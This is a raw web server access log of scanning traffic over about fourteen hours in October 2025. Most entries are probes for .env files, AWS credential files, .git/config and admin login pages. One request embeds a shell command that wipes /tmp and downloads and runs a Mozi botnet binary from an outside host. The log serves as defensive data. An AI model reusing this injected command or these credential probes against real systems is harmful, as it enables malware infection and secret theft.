13.89.125.19 - - [18/Oct/2025:13:31:57 +0000] "GET /manager/html HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
43.153.10.83 - - [18/Oct/2025:13:43:29 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
87.120.191.84 - - [18/Oct/2025:13:47:54 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
144.172.89.99 - - [18/Oct/2025:13:50:40 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" "-"
151.241.119.166 - - [18/Oct/2025:13:57:14 +0000] "GET /crm/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:14 +0000] "GET /cms/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:14 +0000] "GET /.aws/config HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:14 +0000] "GET /admin/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:14 +0000] "GET /.aws/credentials HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:14 +0000] "GET /api/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:14 +0000] "GET /erp/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:14 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:14 +0000] "GET /app/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:14 +0000] "GET /backend/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:15 +0000] "POST /api/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:16 +0000] "POST /.aws/config HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:16 +0000] "POST /app/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:16 +0000] "POST /backend/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:17 +0000] "POST /crm/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:17 +0000] "POST /cms/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:17 +0000] "POST /.aws/credentials HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:17 +0000] "POST /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:17 +0000] "POST /admin/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.166 - - [18/Oct/2025:13:57:17 +0000] "POST /erp/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
164.92.215.178 - - [18/Oct/2025:14:12:04 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
195.96.129.4 - - [18/Oct/2025:14:12:12 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
87.120.191.84 - - [18/Oct/2025:14:20:44 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
204.76.203.219 - - [18/Oct/2025:14:43:27 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
18.97.19.219 - - [18/Oct/2025:14:55:37 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/50.0.3056.76 Safari/537.32" "-"
195.96.129.4 - - [18/Oct/2025:14:59:11 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
45.153.34.54 - - [18/Oct/2025:15:14:04 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
87.121.84.17 - - [18/Oct/2025:15:27:29 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
54.235.59.182 - - [18/Oct/2025:15:43:56 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
45.38.86.69 - - [18/Oct/2025:15:44:41 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
45.38.86.69 - - [18/Oct/2025:15:44:41 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
204.76.203.219 - - [18/Oct/2025:16:46:25 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
204.76.203.219 - - [18/Oct/2025:17:07:10 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
87.121.84.17 - - [18/Oct/2025:17:30:51 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
104.238.37.88 - - [18/Oct/2025:17:36:12 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
104.238.37.88 - - [18/Oct/2025:17:36:12 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
43.135.133.194 - - [18/Oct/2025:17:36:57 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
198.235.24.135 - - [18/Oct/2025:18:34:53 +0000] "GET / HTTP/1.1" 400 154 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity" "-"
185.244.36.170 - - [18/Oct/2025:18:43:10 +0000] "GET /.git/config HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" "-"
204.76.203.219 - - [18/Oct/2025:19:00:49 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
93.174.93.12 - - [18/Oct/2025:19:25:18 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 150 "-" "-" "-"
87.121.84.17 - - [18/Oct/2025:19:38:07 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
104.239.38.76 - - [18/Oct/2025:20:04:54 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
104.239.38.76 - - [18/Oct/2025:20:04:54 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
195.160.220.89 - - [18/Oct/2025:20:40:42 +0000] "GET /index.php HTTP/1.1" 400 154 "-" "-" "-"
185.244.36.170 - - [18/Oct/2025:20:46:08 +0000] "GET /.git/config HTTP/1.1" 400 154 "-" "Links/0.9.1 (Linux 2.4.24; i386;)" "-"
20.171.8.85 - - [18/Oct/2025:20:46:51 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
204.76.203.219 - - [18/Oct/2025:21:05:56 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
87.121.84.17 - - [18/Oct/2025:21:17:17 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
185.242.226.110 - - [18/Oct/2025:21:22:29 +0000] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x03\xCB|\xF8\x15\x91|l\xA6\x12\x07zg\x19O\xD1\x00\xB5h48nFk~6\x1Fr\xA1\xD1\x07\x07(\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
185.177.72.8 - - [18/Oct/2025:22:01:49 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" "-"
87.121.84.17 - - [18/Oct/2025:22:46:04 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
82.21.248.23 - - [18/Oct/2025:22:48:21 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
82.21.248.23 - - [18/Oct/2025:22:48:21 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:23 +0000] "GET /.aws/credentials HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:23 +0000] "GET /crm/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:23 +0000] "GET /erp/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:23 +0000] "GET /backend/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:23 +0000] "GET /admin/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:23 +0000] "GET /cms/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:23 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:23 +0000] "GET /app/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:23 +0000] "GET /api/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:23 +0000] "GET /.aws/config HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:25 +0000] "POST /crm/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:25 +0000] "POST /backend/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:25 +0000] "POST /api/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:25 +0000] "POST /erp/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:25 +0000] "POST /.aws/credentials HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:25 +0000] "POST /admin/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:25 +0000] "POST /app/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:25 +0000] "POST /.aws/config HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:25 +0000] "POST /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
151.241.119.109 - - [18/Oct/2025:23:00:26 +0000] "POST /cms/.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36" "-"
204.76.203.219 - - [18/Oct/2025:23:14:49 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
91.92.240.147 - - [18/Oct/2025:23:17:52 +0000] "GET / HTTP/1.1" 400 154 "-" "Python/3.12 aiohttp/3.12.15" "-"
93.174.93.12 - - [18/Oct/2025:23:19:10 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
149.130.217.176 - - [18/Oct/2025:23:24:02 +0000] "GET / HTTP/1.1" 400 154 "-" "python-httpx/0.28.1" "-"
204.76.203.212 - - [18/Oct/2025:23:25:52 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
103.203.57.3 - - [18/Oct/2025:23:30:03 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
45.39.35.30 - - [18/Oct/2025:23:40:25 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
45.39.35.30 - - [18/Oct/2025:23:40:26 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
176.123.1.65 - - [19/Oct/2025:00:06:29 +0000] "GET /.git/config HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" "-"
117.205.167.137 - - [19/Oct/2025:00:52:22 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://117.205.167.137:37445/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 400 154 "-" "Hello, world" "-"
204.76.203.219 - - [19/Oct/2025:01:03:45 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
87.121.84.17 - - [19/Oct/2025:01:08:37 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
3.130.96.91 - - [19/Oct/2025:02:12:29 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
3.130.96.91 - - [19/Oct/2025:02:15:31 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
3.130.96.91 - - [19/Oct/2025:02:16:31 +0000] "" 400 0 "-" "-" "-"
3.137.73.221 - - [19/Oct/2025:02:41:32 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
3.137.73.221 - - [19/Oct/2025:02:41:35 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
204.76.203.212 - - [19/Oct/2025:02:43:33 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
87.121.84.17 - - [19/Oct/2025:02:43:40 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
3.137.73.221 - - [19/Oct/2025:02:43:54 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03$\x9E\x9D\x8D2w/}\x5C\x88\xA6T\xFAS\x16NDb%\x98\x80\x9E\x83D6\x96(\xB9\x8C\xFE\xC7~\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
3.137.73.221 - - [19/Oct/2025:02:46:01 +0000] "" 400 0 "-" "-" "-"
3.137.73.221 - - [19/Oct/2025:02:46:35 +0000] "SSH-2.0-Go" 400 150 "-" "-" "-"
3.137.73.221 - - [19/Oct/2025:02:47:05 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xDD\x04\xBF2u\x0F\xCCB\x8B\xD3\x91\xFF\xDE\x9Cl" 400 150 "-" "-" "-"
64.62.156.108 - - [19/Oct/2025:02:58:20 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15" "-"
64.62.156.108 - - [19/Oct/2025:02:59:34 +0000] "GET /webui/ HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
204.76.203.219 - - [19/Oct/2025:02:59:58 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
64.62.156.108 - - [19/Oct/2025:03:01:58 +0000] "GET /geoserver/web/ HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15" "-"
216.180.246.41 - - [19/Oct/2025:03:19:13 +0000] "GET / HTTP/1.0" 400 143 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.41 - - [19/Oct/2025:03:19:29 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA0\xCD\x10\x1C\x01,\xE0\xECi\xB9y\xA8\xF7\x80\xCB\xE2TR\x850\xCC\x9Dsx\xFF\xDE\xD4\xBD\x88\xF9g\xA6 \xA8\x03\xEAM\x96'\xE4\xAB\xF1\xC5\xC07\x8Bm\xBF\xE6\x13r\xDC \x8F\xBB\xFEQ`\xD3\xDA\x7F\x80tz\xE8\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
216.180.246.41 - - [19/Oct/2025:03:20:20 +0000] "GET / HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
198.235.24.162 - - [19/Oct/2025:03:20:38 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xDE\xAEcH\xF6_\xE9\x10\xC8s\x9E\x15\xC8\x9CC\x97\x02~\xC6\x00xa92\x9C\xB6T\x93\xED\xC8\x84\xA5\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 150 "-" "-" "-"
198.235.24.162 - - [19/Oct/2025:03:20:38 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x007\xC5<\xF3\x96mV\xAEb\xE2e\x7F\xCD\x0F\x09f\x96\xB3\xA3W\xD7>\xC7c\x1D\x16\x02M\xE3\xDA\xED P#\x07\xB1v\x1C\xF4\x5C\xD8\xB1\x83\x86I\x0B\xBA\xB6<\x16S>%\x08N\x98{K\x94V'\xD4n\xEA\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 150 "-" "-" "-"
192.186.172.23 - - [19/Oct/2025:03:24:27 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
192.186.172.23 - - [19/Oct/2025:03:24:27 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
216.180.246.41 - - [19/Oct/2025:03:24:55 +0000] "GET /manage/account/login HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.41 - - [19/Oct/2025:03:27:21 +0000] "GET /admin/index.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.41 - - [19/Oct/2025:03:31:00 +0000] "GET /index.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
45.142.193.27 - - [19/Oct/2025:03:31:06 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
216.180.246.41 - - [19/Oct/2025:03:34:00 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 400 154 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
